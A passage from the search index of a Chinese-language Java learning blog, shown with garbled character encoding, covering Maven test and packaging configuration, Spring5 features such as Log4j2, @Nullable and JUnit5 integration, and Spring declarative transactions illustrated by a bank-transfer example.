é…ç½®å®Œæˆåï¼Œåœ¨ Maven å·¥å…·çª—å£ä¸‹è‡ªåŠ¨ç”Ÿæˆäº†ä¸€ä¸ª Run Configurations èŠ‚ç‚¹ï¼Œåœ¨è¯¥èŠ‚ç‚¹ä¸‹å¯ä»¥çœ‹åˆ°è¿è¡Œé…ç½®åˆ—è¡¨\n  - åœ¨è¿è¡Œé…ç½®åˆ—è¡¨ä¸­ï¼ŒåŒå‡»ç›®æ ‡ï¼Œæˆ–å³é”®ç‚¹å‡»è¯¥ç›®æ ‡ç„¶ä»ä¸Šä¸‹æ–‡èœå•ä¸­é€‰æ‹© Runï¼Œå³å¯è¿è¡Œè¯¥ç›®æ ‡ã€‚\n\n## Mavenæµ‹è¯•é¡¹ç›®\n\né€šè¿‡ä½¿ç”¨`test`å‘½ä»¤ï¼Œå¯ä»¥ä¸€é”®æµ‹è¯•æ‰€æœ‰ä½äºtestç›®å½•ä¸‹çš„æµ‹è¯•æ¡ˆä¾‹ï¼Œè¯·æ³¨æ„æœ‰ä»¥ä¸‹è¦æ±‚ï¼š\n\n* æµ‹è¯•ç±»çš„åç§°å¿…é¡»æ˜¯ä»¥`Test`ç»“å°¾ï¼Œæ¯”å¦‚`MainTest`\n* æµ‹è¯•æ–¹æ³•ä¸Šå¿…é¡»æ ‡æ³¨`@Test`æ³¨è§£ï¼Œå®æµ‹`@RepeatedTest`æ— æ•ˆ\n\nè¿™æ˜¯ç”±äºJUnit5æ¯”è¾ƒæ–°ï¼Œæˆ‘ä»¬éœ€è¦é‡æ–°é…ç½®æ’ä»¶å‡çº§åˆ°é«˜ç‰ˆæœ¬ï¼Œæ‰èƒ½å®Œç¾çš„å…¼å®¹Junit5ï¼š\n\n```xml\n<build>\n    <plugins>\n        <plugin>\n            <groupId>org.apache.maven.plugins</groupId>\n            <artifactId>maven-surefire-plugin</artifactId>\n            <!-- JUnit 5 requires Surefire version 2.22.0 or higher -->\n            <version>2.22.0</version>\n        </plugin>\n    </plugins>\n</build>\n```\n\nç°åœ¨`@RepeatedTest`ã€`@BeforeAll`ä¹Ÿèƒ½ä½¿ç”¨äº†ã€‚\n\n## Mavenæ‰“åŒ…é¡¹ç›®\n\næˆ‘ä»¬çš„é¡¹ç›®åœ¨ç¼–å†™å®Œæˆä¹‹åï¼Œè¦ä¹ˆä½œä¸ºJarä¾èµ–ï¼Œä¾›å…¶ä»–æ¨¡å‹ä½¿ç”¨ï¼Œè¦ä¹ˆå°±ä½œä¸ºä¸€ä¸ªå¯ä»¥æ‰§è¡Œçš„ç¨‹åºï¼Œåœ¨æ§åˆ¶å°è¿è¡Œï¼Œæˆ‘ä»¬åªéœ€è¦ç›´æ¥æ‰§è¡Œ`package`å‘½ä»¤å°±å¯ä»¥ç›´æ¥å¯¹é¡¹ç›®çš„ä»£ç è¿›è¡Œæ‰“åŒ…ï¼Œç”Ÿæˆjaræ–‡ä»¶ã€‚\n\nå½“ç„¶ï¼Œä»¥ä¸Šæ–¹å¼ä»…é€‚ç”¨äºä½œä¸ºJarä¾èµ–çš„æƒ…å†µï¼Œå¦‚æœæˆ‘ä»¬éœ€è¦æ‰“åŒ…ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä¸ä»…éœ€è¦å°†è‡ªå·±ç¼–å†™çš„ç±»æ‰“åŒ…åˆ°Jarä¸­ï¼ŒåŒæ—¶è¿˜éœ€è¦å°†ä¾èµ–ä¹Ÿä¸€å¹¶æ‰“åŒ…åˆ°Jarä¸­ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨å¦ä¸€ä¸ªæ’ä»¶æ¥å®ç°ä¸€èµ·æ‰“åŒ…ï¼š\n\n```xml\n<plugin>\n    <artifactId>maven-assembly-plugin</artifactId>\n    <version>3.1.0</version>\n    <configuration>\n        <descriptorRefs>\n            <descriptorRef>jar-with-dependencies</descriptorRef>\n        </descriptorRefs>\n        <archive>\n            <manifest>\n                <addClasspath>true</addClasspath>\n                <mainClass>com.test.Main</mainClass>\n            </manifest>\n        </archive>\n    </configuration>\n    <executions>\n        <execution>\n            <id>make-assembly</id>\n            <phase>package</phase>\n            <goals>\n                <goal>single</goal>\n            </goals>\n        </execution>\n    </executions>\n</plugin>\n```\n\nåœ¨æ‰“åŒ…ä¹‹å‰ä¹Ÿä¼šæ‰§è¡Œä¸€æ¬¡testå‘½ä»¤ï¼Œæ¥ä¿è¯é¡¹ç›®èƒ½å¤Ÿæ­£å¸¸è¿è¡Œï¼Œå½“æµ‹è¯•å‡ºç°é—®é¢˜æ—¶ï¼Œæ‰“åŒ…å°†æ— æ³•å®Œæˆï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æ‰‹åŠ¨è·³è¿‡ï¼Œé€‰æ‹©`æ‰§è¡ŒMavenç›®æ ‡`æ¥æ‰‹åŠ¨æ‰§è¡ŒMavenå‘½ä»¤ï¼Œè¾“å…¥`mvn package -Dmaven.test.skip=true `æ¥ä»¥è·³è¿‡æµ‹è¯•çš„æ–¹å¼è¿›è¡Œæ‰“åŒ…ã€‚\n\næœ€åå¾—åˆ°æˆ‘ä»¬çš„Jaræ–‡ä»¶ï¼Œåœ¨åŒçº§ç›®å½•ä¸‹è¾“å…¥`java -jar xxxx.jar`æ¥è¿è¡Œæˆ‘ä»¬æ‰“åŒ…å¥½çš„Jarå¯æ‰§è¡Œç¨‹åºï¼ˆxxxä»£è¡¨æ–‡ä»¶åç§°ï¼‰\n\n* `deploy`å‘½ä»¤ç”¨äºå‘å¸ƒé¡¹ç›®åˆ°æœ¬åœ°ä»“åº“å’Œè¿œç¨‹ä»“åº“ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ç”¨ä¸åˆ°ã€‚\n* `site`å‘½ä»¤ç”¨äºç”Ÿæˆå½“å‰é¡¹ç›®çš„å‘å¸ƒç«™ç‚¹ï¼Œæš‚æ—¶ä¸éœ€è¦äº†è§£ã€‚\n\nå¤šæ¨¡å—ä¸‹çˆ¶é¡¹ç›®å­˜åœ¨ä¸€ä¸ª`packing`æ‰“åŒ…ç±»å‹æ ‡ç­¾ï¼Œæ‰€æœ‰çš„çˆ¶çº§é¡¹ç›®çš„packingéƒ½ä¸ºpomï¼Œpackingé»˜è®¤æ˜¯jarç±»å‹ï¼Œå¦‚æœä¸ä½œé…ç½®ï¼Œmavenä¼šå°†è¯¥é¡¹ç›®æ‰“æˆjaråŒ…ã€‚ä½œä¸ºçˆ¶çº§é¡¹ç›®ï¼Œè¿˜æœ‰ä¸€ä¸ªé‡è¦çš„å±æ€§ï¼Œé‚£å°±æ˜¯modulesï¼Œé€šè¿‡modulesæ ‡ç­¾å°†é¡¹ç›®çš„æ‰€æœ‰å­é¡¹ç›®å¼•ç”¨è¿›æ¥ï¼Œåœ¨buildçˆ¶çº§é¡¹ç›®æ—¶ï¼Œä¼šæ ¹æ®å­æ¨¡å—çš„ç›¸äº’ä¾èµ–å…³ç³»æ•´ç†ä¸€ä¸ªbuildé¡ºåºï¼Œç„¶åä¾æ¬¡buildã€‚\n\n## å‚è€ƒ\n\n- [Mavenæ•™ç¨‹](http://c.biancheng.net/maven2/profile.html)\n- [JavaWebç¬”è®°ï¼ˆä¸‰ï¼‰](https://blog.csdn.net/qq_25928447/article/details/121387814?spm=1001.2014.3001.5502)\n- [JavaWeb æ•™ç¨‹ å“”å“©å“”å“©_bilibili](https://www.bilibili.com/video/BV1CL4y1i7qR?p=51)ï¼ˆ51pï½55pï¼‰\n\n## â¤ï¸Sponsor\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ°å·§è´¢åŠ›é›„åšï¼Œåˆæ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["Maven"],"categories":["JavaWeb"]},{"title":"Spring5-æ–°ç‰¹æ€§","url":"/posts/16410.html","content":"\n##  å‰è¨€\n\nä»Šå¤©å¼€å§‹å­¦ä¹ æˆ‘è‡ªå·±æ€»ç»“çš„ [Java-å­¦ä¹ è·¯çº¿](https://jwt1399.top/posts/29829.html) ä¸­çš„ã€ŠSpring5-æ–°ç‰¹æ€§ã€‹ï¼Œå°ç®€ä» 0 å¼€å§‹å­¦ Java çŸ¥è¯†ï¼Œå¹¶ä¸å®šæœŸæ›´æ–°æ‰€å­¦ç¬”è®°ï¼ŒæœŸå¾…ä¸€å¹´åçš„èœ•å˜å§ï¼<æœ‰åŒæ ·æƒ³æ³•çš„å°ä¼™ä¼´ï¼Œå¯ä»¥è”ç³»æˆ‘ä¸€èµ·äº¤æµå­¦ä¹ å“¦ï¼>\n\n- [x] ğŸš©æ—¶é—´å®‰æ’ï¼šé¢„è®¡1å¤©æ›´æ–°å®Œ\n- [x] ğŸ¯å¼€å§‹æ—¶é—´ï¼š04-18\n- [x] ğŸ‰ç»“æŸæ—¶é—´ï¼š04-18\n- [x] ğŸ€æ€»ç»“ï¼šæŒ‰æ—¶å®Œæˆï¼Œä½†æ˜¯å®Œå…¨è®°ä¸ä½ï¼Œè‡ªå·±å†™è¿˜å¾—çœ‹æ–‡æ¡£ï¼\n\n## Spring5 ç®€ä»‹\n\n- Spring5 æ¡†æ¶çš„ä»£ç åŸºäº**Java8**ï¼Œè¿è¡Œæ—¶å…¼å®¹ **JDK9**ï¼Œè®¸å¤šä¸å»ºè®®ä½¿ç”¨çš„ç±»å’Œæ–¹æ³•åœ¨ä»£ç åº“ä¸­åˆ é™¤\n\n-  Spring5 æ¡†æ¶è‡ªå¸¦äº†é€šç”¨çš„æ—¥å¿—å°è£… **Log4j2** \n  - Spring5 å·²ç»ç§»é™¤Log4jConfigListenerï¼Œå®˜æ–¹å»ºè®®ä½¿ç”¨ Log4j2 \n  - Spring5 æ¡†æ¶æ•´åˆLog4j2 \n- Spring5 æ¡†æ¶æ ¸å¿ƒå®¹å™¨æ”¯æŒ **@Nullable** æ³¨è§£ \n- Spring5 æ¡†æ¶æ”¯æŒæ•´åˆ **JUnit5** \n- Spring5 æ ¸å¿ƒå®¹å™¨æ”¯æŒå‡½æ•°å¼é£æ ¼ **GenericApplicationContext** \n- Spring5 æ¡†æ¶æ–°åŠŸèƒ½ **Webflux**\n\n## é€šç”¨çš„æ—¥å¿—å°è£…\n\n### 1ã€å¼•å…¥jaråŒ…\n\nLog4j2ä¸‹è½½åœ°å€ï¼š[Download Apache Log4j 2](https://logging.apache.org/log4j/2.x/download.html)\n\nslf4jä¸‹è½½åœ°å€ï¼š[org/slf4j (maven.org)](https://repo1.maven.org/maven2/org/slf4j/)\n\n```java\nslf4j-api-1.7.36.jar\nlog4j-api-2.17.2.jar\nlog4j-core-2.17.2.jar\nlog4j-slf4j-impl-2.17.2.jar\n```\n\n### 2ã€åˆ›å»ºlog4j2.xmlé…ç½®æ–‡ä»¶ \n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!--æ—¥å¿—çº§åˆ«ä»¥åŠä¼˜å…ˆçº§æ’åº: OFF > FATAL > ERROR > WARN > INFO > DEBUG > TRACE > ALL -->\n<!--Configuration åé¢çš„ status ç”¨äºè®¾ç½® log4j2 è‡ªèº«å†…éƒ¨çš„ä¿¡æ¯è¾“å‡ºï¼Œå¯ä»¥ä¸è®¾ç½®ï¼Œå½“è®¾ç½®æˆ trace æ—¶ï¼Œå¯ä»¥çœ‹åˆ° log4j2 å†…éƒ¨å„ç§è¯¦ç»†è¾“å‡º-->\n<configuration status=\"INFO\">\n    <!--å…ˆå®šä¹‰æ‰€æœ‰çš„ appender-->\n    <appenders>\n        <!--è¾“å‡ºæ—¥å¿—ä¿¡æ¯åˆ°æ§åˆ¶å°-->\n        <console name=\"Console\" target=\"SYSTEM_OUT\">\n            <!--æ§åˆ¶æ—¥å¿—è¾“å‡ºçš„æ ¼å¼-->\n            <PatternLayout pattern=\"%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n\"/>\n        </console>\n    </appenders>\n    <!--ç„¶åå®šä¹‰ loggerï¼Œåªæœ‰å®šä¹‰ logger å¹¶å¼•å…¥çš„ appenderï¼Œappender æ‰ä¼šç”Ÿæ•ˆ-->\n    <!--rootï¼šç”¨äºæŒ‡å®šé¡¹ç›®çš„æ ¹æ—¥å¿—ï¼Œå¦‚æœæ²¡æœ‰å•ç‹¬æŒ‡å®š Loggerï¼Œåˆ™ä¼šä½¿ç”¨ root ä½œä¸ºé»˜è®¤çš„æ—¥å¿—è¾“å‡º-->\n    <loggers>\n        <root level=\"info\">\n            <appender-ref ref=\"Console\"/>\n        </root>\n    </loggers>\n</configuration>\n```\n\n## **@Nullable** æ³¨è§£ \n\n@Nullable æ³¨è§£å¯ä»¥ä½¿ç”¨åœ¨æ–¹æ³•ä¸Šé¢ï¼Œå±æ€§ä¸Šé¢ï¼Œå‚æ•°ä¸Šé¢ï¼Œè¡¨ç¤ºæ–¹æ³•è¿”å›å¯ä»¥ä¸ºç©ºï¼Œå±æ€§å€¼å¯ä»¥ä¸ºç©ºï¼Œå‚æ•°å€¼å¯ä»¥ä¸ºç©º\n\n- æ³¨è§£ç”¨åœ¨æ–¹æ³•ä¸Šé¢ï¼Œæ–¹æ³•è¿”å›å€¼å¯ä»¥ä¸ºç©º\n\n```java\n@Nullable\nString getId()\n```\n\n- æ³¨è§£ä½¿ç”¨åœ¨æ–¹æ³•å‚æ•°é‡Œé¢ï¼Œæ–¹æ³•å‚æ•°å¯ä»¥ä¸ºç©º \n\n```java\npublic ClassPathXmlApplicationContext(String[] configLocations, @Nullable ApplicationContext parent) throws BeansException {\n  this(configLocations, true, parent);\n}\n```\n\n- æ³¨è§£ä½¿ç”¨åœ¨å±æ€§ä¸Šé¢ï¼Œå±æ€§å€¼å¯ä»¥ä¸ºç©º \n\n```java\n@Nullable\nprivate Resource[] configResources;\n```\n\n## å‡½æ•°å¼æ³¨å†Œå¯¹è±¡\n\n```java\n// å‡½æ•°å¼é£æ ¼åˆ›å»ºå¯¹è±¡ï¼Œäº¤ç»™Springè¿›è¡Œç®¡ç†\n@Test\npublic void testGenericApplicationContext() {\n    //1 åˆ›å»º GenericApplicationContext å¯¹è±¡\n    GenericApplicationContext context = new GenericApplicationContext();\n    //2 è°ƒç”¨ context çš„æ–¹æ³•å¯¹è±¡æ³¨å†Œ\n    // refreshæŠŠå†…å®¹æ¸…ç©ºè¿›è¡Œæ³¨å†Œ\n    context.refresh();\n\n    context.registerBean(User.class, () -> new User());\n    context.registerBean(\"user1\", User.class, () -> new User());\n\n    // è·å–åœ¨Springé‡Œæ³¨å†Œçš„å¯¹è±¡\n    Object user = context.getBean(\"com.jwt.aop.User\");\n    Object user1 = context.getBean(\"user1\");\n    System.out.println(user);\n    System.out.println(user1);\n}\n\n/**\ncom.jwt.aop.User@3712b94\ncom.jwt.aop.User@2833cc44\n**/\n```\n\n## æ”¯æŒJUnit 5\n\n### JUnit4\n\n1ã€å¼•å…¥ä¾èµ–\n\n```java\nhamcrest-core-1.3.jar  //JUnit4\njunit-4.12.jar //JUnit4\nspring-test-5.3.18.jar //å•å…ƒæµ‹è¯•æ³¨è§£\n```\n\n2ã€åˆ›å»ºæµ‹è¯•ç±»ï¼Œä½¿ç”¨æ³¨è§£æ–¹å¼å®ç°\n\n```java\n@RunWith(SpringJUnit4ClassRunner.class) //å•å…ƒæµ‹è¯•æ¡†æ¶\n@ContextConfiguration(\"classpath:jdbc.xml\") //åŠ è½½é…ç½®æ–‡ä»¶\npublic class JTest4 {\n    @Autowired \n    private UserService userService;\n    @Test\n    public void test() {\n        userService.accountMoney();\n    }\n}\n```\n\nå¯ä»¥ä»£æ›¿ä¸‹é¢çš„æµ‹è¯•æ–¹æ³•ï¼Œç®€åŒ–ä»£ç \n\n```java\n@Test\npublic void testTransaction() {\n  ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(\"jdbc.xml\");\n  UserService userService = context.getBean(\"userService\", UserService.class);\n  userService.accountMoney();\n}\n```\n\n### JUnit5\n\n1ã€å¼•å…¥JUnit5çš„jaråŒ… \n\n2ã€åˆ›å»ºæµ‹è¯•ç±»ï¼Œä½¿ç”¨æ³¨è§£æ–¹å¼å®ç°\n\n```java\n@ExtendWith(SpringExtension.class)\n@ContextConfiguration(\"classpath:jdbc.xml\")\npublic class JTest5 {\n    @Autowired\n    private UserService userService;\n    @Test\n    public void testJunit5() {\n        userService.add();\n    }\n}\n```\n\nä½¿ç”¨ä¸€ä¸ªå¤åˆæ³¨è§£æ›¿ä»£ä¸Šé¢ä¸¤ä¸ªæ³¨è§£å®Œæˆæ•´åˆ\n\n```java\n@SpringJUnitConfig(locations = \"classpath:jdbc.xml\")\npublic class JTest5 {\n    @Autowired\n    private UserService userService;\n    @Test\n    public void testJunit5() {\n        userService.add();\n    }\n}\n```\n\n## Webflux\n\nå­¦å®Œ SpringMVC å†å­¦\n\n## â¤ï¸Sponsor\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ°å·§è´¢åŠ›é›„åšï¼Œåˆæ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["Spring"],"categories":["Spring"]},{"title":"Spring-äº‹åŠ¡","url":"/posts/24314.html","content":"\n##  å‰è¨€\n\nä»Šå¤©å¼€å§‹å­¦ä¹ æˆ‘è‡ªå·±æ€»ç»“çš„ [Java-å­¦ä¹ è·¯çº¿](https://jwt1399.top/posts/29829.html) ä¸­çš„ã€ŠSpring-äº‹åŠ¡ã€‹ï¼Œå°ç®€ä» 0 å¼€å§‹å­¦ Java çŸ¥è¯†ï¼Œå¹¶ä¸å®šæœŸæ›´æ–°æ‰€å­¦ç¬”è®°ï¼ŒæœŸå¾…ä¸€å¹´åçš„èœ•å˜å§ï¼<æœ‰åŒæ ·æƒ³æ³•çš„å°ä¼™ä¼´ï¼Œå¯ä»¥è”ç³»æˆ‘ä¸€èµ·äº¤æµå­¦ä¹ å“¦ï¼>\n\n- [x] ğŸš©æ—¶é—´å®‰æ’ï¼šé¢„è®¡1å¤©æ›´æ–°å®Œ\n- [x] ğŸ¯å¼€å§‹æ—¶é—´ï¼š04-17\n- [x] ğŸ‰ç»“æŸæ—¶é—´ï¼š04-17\n- [x] ğŸ€æ€»ç»“ï¼šä½¿ç”¨å¾ˆç®€å•ï¼Œä¸€å¤©æå®šï¼Œæºç éƒ¨åˆ†åé¢å†çœ‹\n\n## äº‹ç‰©æ¦‚å¿µ\n\n- äº‹åŠ¡æ˜¯æ•°æ®åº“æ“ä½œæœ€åŸºæœ¬å•å…ƒï¼Œé€»è¾‘ä¸Šä¸€ç»„æ“ä½œï¼Œè¦ä¹ˆéƒ½æˆåŠŸï¼Œå¦‚æœæœ‰ä¸€ä¸ªå¤±è´¥æ‰€æœ‰æ“ä½œéƒ½å¤±è´¥\n- å…¸å‹åœºæ™¯ï¼šé“¶è¡Œè½¬è´¦\n  - å°æ˜è½¬è´¦100å…ƒç»™å°çº¢\n  - å°æ˜å°‘100ï¼Œå°çº¢å¤š100 \n\n- äº‹åŠ¡å››ä¸ªç‰¹æ€§(ACID)\n  - åŸå­æ€§ï¼šæ“ä½œä¸å¯åˆ†å‰²ï¼Œè¦ä¹ˆéƒ½æˆåŠŸè¦ä¹ˆéƒ½å¤±è´¥\n  - ä¸€è‡´æ€§ï¼šæ“ä½œä¹‹å‰å’Œæ“ä½œä¹‹åçš„æ€»é‡ä¸å˜\n  - éš”ç¦»æ€§ï¼šå¤šäº‹åŠ¡æ“ä½œï¼Œå„ä¸ªäº‹åŠ¡ä¹‹é—´ä¸ä¼šäº§ç”Ÿå½±å“\n  - æŒä¹…æ€§ï¼šäº‹åŠ¡æäº¤ï¼Œè¡¨ä¸­æ•°æ®å‘ç”Ÿå˜åŒ–\n\n## å¼•å‡ºäº‹åŠ¡\n\n- Daoâ€”â€”æ•°æ®åº“æ“ä½œ\n  - å°‘é’±æ–¹æ³•\n  - å¤šé’±æ–¹æ³•\n\n- Serviceâ€”â€”ä¸šåŠ¡æ“ä½œ\n  - è°ƒç”¨Daoçš„ä¸¤ä¸ªæ–¹æ³•\n\n1ã€åˆ›å»ºæ•°æ®è¡¨ï¼Œæ·»åŠ è®°å½•\n\n```sql\nid\tname\tmoney\n1\t å°æ˜\t 1000\n2\t å°çº¢\t 1000\n```\n\n2ã€åˆ›å»º serviceï¼Œæ­å»º daoï¼Œå®Œæˆå¯¹è±¡åˆ›å»ºå’Œæ³¨å…¥å…³ç³»\n\n```java\n//åœ¨ dao æ³¨å…¥ JdbcTemplateï¼Œservice æ³¨å…¥ dao\npublic interface UserDao{\n  \n}\n\n@Repository\npublic class UserDaoImpl implements UserDao {\n   //æ³¨å…¥ JdbcTemplate\n   @Autowired\n   private JdbcTemplate jdbcTemplate;\n}\n\n@Service\npublic class UserService {\n   //æ³¨å…¥ dao\n   @Autowired\n   private UserDao userDao;\n}\n```\n\n3ã€åœ¨ dao åˆ›å»ºä¸¤ä¸ªæ–¹æ³•ï¼šå¤šé’±å’Œå°‘é’±çš„æ–¹æ³•ï¼Œ åœ¨ service åˆ›å»ºè½¬è´¦çš„æ–¹æ³•\n\n```java\npublic interface UserDao{\n  void reduceMoney();\n  void addMoney(); \n}\n\n@Repository\npublic class UserDaoImpl implements UserDao {\n   @Autowired\n   private JdbcTemplate jdbcTemplate;\n   //å°‘é’±\n   @Override\n   public void reduceMoney() {\n       String sql = \"update account set money=money-? where username=?\";\n       jdbcTemplate.update(sql,100,\"å°æ˜\");\n   }\n   //å¤šé’±\n   @Override\n   public void addMoney() {\n       String sql = \"update account set money=money+? where username=?\";\n       jdbcTemplate.update(sql,100,\"å°çº¢\");\n   }\n}\n\n@Service\npublic class UserService {\n   //æ³¨å…¥ dao\n   @Autowired\n   private UserDao userDao;\n   //è½¬è´¦çš„æ–¹æ³•\n   public void accountMoney() {\n       userDao.reduceMoney();\n       userDao.addMoney();\n   }\n}\n```\n\n4ã€æµ‹è¯•\n\n```java\n@Test\npublic void testTransaction() {\n  ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(\"jdbc.xml\");\n  UserService userService = context.getBean(\"userService\", UserService.class);\n  userService.accountMoney();\n}\n```\n\n```sql\nid\tname\tmoney\n1\t å°æ˜\t 900\n2\t å°çº¢\t 1100\n```\n\nä¸Šè¾¹ä»£ç æ­£å¸¸æ‰§è¡Œæ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯å¦‚æœä»£ç æ‰§è¡Œè¿‡ç¨‹ä¸­å‡ºç°å¼‚å¸¸ï¼Œå°±æœ‰é—®é¢˜ï¼Œå¦‚ä¸‹æ¨¡æ‹Ÿå¼‚å¸¸ï¼\n\n```java\n@Service\npublic class UserService {\n    //è¿™é‡Œæ‰§è¡Œåå°†ä¼šäº§ç”Ÿé”™è¯¯ï¼ˆå¼‚å¸¸ï¼‰ï¼Œå°æ˜å°‘100åï¼Œå°çº¢ä¸ä¼šå¤š100ï¼Œè¿™å°±ä¸å¯¹äº†ï¼ï¼\n    private UserDao userDao;\n    //è½¬è´¦æ–¹æ³•\n    public void accountMoney(){\n        userDao.reduceMoney();//å°æ˜å°‘100\n        int x=10/0; //å¼‚å¸¸\n        userDao.addMoney(); //å°çº¢ä¸ä¼šå¢åŠ 100\n    }\n}\n```\n\n```sql\nid\tname\tmoney\n1\t å°æ˜\t 900\n2\t å°çº¢\t 1000 #æ²¡æœ‰å¢åŠ 100\n```\n\nä¸Šé¢é—®é¢˜å¦‚ä½•è§£å†³å‘¢ï¼Ÿ ç­”ï¼šä½¿ç”¨äº‹åŠ¡è¿›è¡Œè§£å†³ \n\n```java\n//è§£å†³ä¸Šè¾¹çš„å¼‚å¸¸æ–¹æ³•â€”â€”ã€ç¼–ç¨‹å¼äº‹åŠ¡ï¼ˆä¼ ç»Ÿæ–¹æ³•ï¼‰ã€‘\n//è½¬è´¦çš„æ–¹æ³•\npublic void accountMoney() {\n  try {\n    //ç¬¬ä¸€æ­¥ å¼€å¯äº‹åŠ¡\n\n    //ç¬¬äºŒæ­¥ è¿›è¡Œä¸šåŠ¡æ“ä½œ\n    userDao.reduceMoney();\n\n    //æ¨¡æ‹Ÿå¼‚å¸¸\n    int i = 10/0;\n\n    userDao.addMoney();\n\n    //ç¬¬ä¸‰æ­¥ æ²¡æœ‰å‘ç”Ÿå¼‚å¸¸ï¼Œæäº¤äº‹åŠ¡\n  }catch(Exception e) {\n    //ç¬¬å››æ­¥ å‡ºç°å¼‚å¸¸ï¼Œäº‹åŠ¡å›æ»š\n  }\n}\n```\n\n## äº‹åŠ¡ç®¡ç†\n\n- äº‹åŠ¡æ·»åŠ åˆ° JavaEE ä¸‰å±‚ç»“æ„é‡Œé¢çš„ Service å±‚ï¼ˆä¸šåŠ¡é€»è¾‘å±‚ï¼‰\n\n- åœ¨ Spring è¿›è¡Œäº‹åŠ¡ç®¡ç†æ“ä½œæœ‰ä¸¤ç§æ–¹å¼\n  - ç¼–ç¨‹å¼äº‹åŠ¡ç®¡ç†\n  - å£°æ˜å¼äº‹åŠ¡ç®¡ç†ï¼ˆæ¨èä½¿ç”¨ï¼‰\n    - åŸºäº xml é…ç½®æ–‡ä»¶æ–¹å¼\n    - åŸºäºæ³¨è§£æ–¹å¼ï¼ˆæ¨èä½¿ç”¨ï¼‰\n\n- åœ¨ Spring è¿›è¡Œå£°æ˜å¼äº‹åŠ¡ç®¡ç†ï¼Œåº•å±‚ä½¿ç”¨ AOP åŸç†\n\n- Spring äº‹åŠ¡ç®¡ç† API ï¼šæä¾›ä¸€ä¸ªæ¥å£ï¼Œä»£è¡¨äº‹åŠ¡ç®¡ç†å™¨ï¼Œè¿™ä¸ªæ¥å£é’ˆå¯¹ä¸åŒçš„æ¡†æ¶æä¾›ä¸åŒçš„å®ç°ç±»\n\n## æ³¨è§£å£°æ˜å¼\n\n1ã€åœ¨ spring é…ç½®æ–‡ä»¶é…ç½®äº‹åŠ¡ç®¡ç†å™¨\n\n```xml\n<!--åˆ›å»ºäº‹åŠ¡ç®¡ç†å™¨-->\n<bean id=\"transactionManager\"\nclass=\"org.springframework.jdbc.datasource.DataSourceTransactionManager\">\n <!--æ³¨å…¥æ•°æ®æº-->\n <property name=\"dataSource\" ref=\"dataSource\"></property>\n</bean>\n```\n\n2ã€åœ¨ spring é…ç½®æ–‡ä»¶ï¼Œå¼€å¯äº‹åŠ¡æ³¨è§£,å¼•å…¥txåç§°ç©ºé—´\n\n```xml\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xmlns:context=\"http://www.springframework.org/schema/context\"\n       xmlns:aop=\"http://www.springframework.org/schema/aop\"\n       xmlns:tx=\"http://www.springframework.org/schema/tx\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n       http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\n       http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd \n       http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd\">\n  \n</beans>\n```\n\n3ã€å¼€å¯äº‹åŠ¡æ³¨è§£\n\n```xml\n<tx:annotation-driven transaction-manager=\"transactionManager\"></tx:annotation-driven>\n```\n\n4ã€åœ¨ service ç±»ä¸Šé¢ï¼ˆæˆ–è€… service ç±»é‡Œé¢æ–¹æ³•ä¸Šé¢ï¼‰æ·»åŠ äº‹åŠ¡æ³¨è§£\n\n- @Transactionalï¼Œè¿™ä¸ªæ³¨è§£æ·»åŠ åˆ°ç±»ä¸Šé¢ï¼Œä¹Ÿå¯ä»¥æ·»åŠ æ–¹æ³•ä¸Šé¢\n- 